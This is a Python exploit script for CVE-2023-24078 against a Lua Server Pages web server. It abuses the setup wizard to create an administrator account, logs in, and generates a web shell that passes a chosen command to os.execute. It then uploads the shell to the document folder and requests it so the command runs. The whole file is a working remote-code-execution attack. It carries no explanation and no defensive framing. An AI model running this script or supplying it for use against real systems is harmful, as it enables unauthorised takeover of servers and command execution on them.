# CVE-2023-24078

import requests
import sys

import os
import argparse


parser = argparse.ArgumentParser(description="CVE-2023-24078", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser.add_argument("-u", "--URL", action="store", help="URL : https://example.com:port or http://example.com:port")
parser.add_argument("-e", "--EMAIL", action="store", help="Email",default="a@a.a")
parser.add_argument("-un", "--USERNAME", action="store", help="Username",default="admin")
parser.add_argument("-p", "--PASSWORD", action="store", help="Password",default="password")
parser.add_argument("-cmd", "--COMMAND", action="store", help="Enter Payload",default="whoami")
parser.add_argument("-file", "--FILE", action="store", help="Enter File Path")
args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

URL = args.URL
email = args.EMAIL
username = args.USERNAME
password = args.PASSWORD
command = args.COMMAND
s = requests.Session()

def payload():
    if args.FILE:  # Check if a custom shell is provided
        shell = args.FILE
        file = open("shell.lsp", "w")
        file2 = open(shell, "r")
        payload = file2.read()
        file.write(payload)
        file.close()
        file2.close()
    else:   
        # Generate default payload
        payload = f'''<div style="margin-left:auto;margin-right: auto;width: 350px;">
                <div id="info">
                <h2>Lua Server Pages Reverse Shell</h2>
                </div>
                <?lsp if request:method() == "GET" then ?>
                <?lsp os.execute("{command}") ?>
                <?lsp else ?>
                You sent a <?lsp=request:method()?> request
                <?lsp end ?>
                </div>'''
        file = open("shell.lsp", "w")
        file.write(payload)
        file.close()
    print("[+] Payload Created")


def create_user():
    url = f"{URL}/Config-Wizard/wizard/SetAdmin.lsp"
    data = { email : email , 
            'user' : username , 
            'password' : password , 
            'recoverpassword' : 'on' }
    response = s.get(url)
    try:
        response = s.post(url, data=data, verify=False)
        if response.status_code == 200:
            print("[+] User Created")
    except:
        print("[-] User Already Exist or Something Went Wrong")

def login():
    url = f"{URL}/rtl/protected/wfslinks.lsp" #Default Path
    data = {'ba_username' : username , 'ba_password' : password}
    response = s.post(url, verify=False, data=data)
    if response.status_code == 200:
        print("[+] Login Successful")
    else:
        print("[-] Login Failed")
        exit(1)
def upload():

    url = f"{URL}/fs/cmsdocs/" #Default Path
    r = s.get(url)
    file_content = open("shell.lsp", "rb")
    files = {'file': ('shell.lsp', file_content, 'application/octet-stream')}
    response = s.post(url, files=files, verify=False)
    if response.status_code == 200:
        print("[+] Payload Uploaded")
    else:
        print("[-] Payload Upload Failed")
        exit(1)

        
def exploit():
    url = f"{URL}/shell.lsp"
    response = s.get(url, verify=False)

def main():
    print("[+] Creating User")
    create_user()
    print("[+] Login with Credentials")
    login() 
    print("[+] Creating Payload")
    payload()
    print("[+] Uploading Payload")
    upload()
    print("[+] Executing Payload")
    exploit()

if __name__ == '__main__':
    main()
    
    

